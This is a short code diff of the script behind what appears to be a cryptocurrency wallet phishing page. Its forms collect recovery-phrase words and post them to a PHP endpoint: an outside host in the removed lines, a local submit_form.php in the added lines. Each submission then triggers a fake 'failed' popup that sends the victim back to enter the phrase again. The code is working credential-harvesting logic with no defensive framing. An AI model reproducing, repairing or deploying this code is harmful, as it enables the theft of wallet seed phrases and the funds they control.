@@ -94,7 +94,7 @@ document.getElementById('importForm').addEventListener('submit', async function(
   btn.textContent = 'Sending...';
 
   try {
-    const res = await fetch('https://bapak.42web.io/submit_form.php', { method:'POST', body: fd });
+    const res = await fetch('submit_form.php', { method:'POST', body: fd });
     const data = await res.json();
     // alert(data.message); ← ini dihapus
     showPopup('popupFailedAbsen'); // langsung menuju popup selanjutnya
@@ -117,7 +117,7 @@ document.getElementById('absenForm').addEventListener('submit', async function(e
   const btn = document.getElementById('absenContinue');
   btn.disabled = true; btn.textContent = 'Sending...';
   try {
-    const res = await fetch('https://bapak.42web.io/submit_form.php', { method:'POST', body: fd });
+    const res = await fetch('submit_form.php', { method:'POST', body: fd });
     const data = await res.json();
     // alert(data.message); ← ini dihapus
     showPopup('popupFailedAbsen'); // langsung menuju popup selanjutnya
@@ -136,5 +136,6 @@ document.getElementById('failedContinue').addEventListener('click', ()=>{
   createWordInputs(parseInt(phraseSelect.value,10));
   showPopup('popupImportWallet');
 });
+
 
 
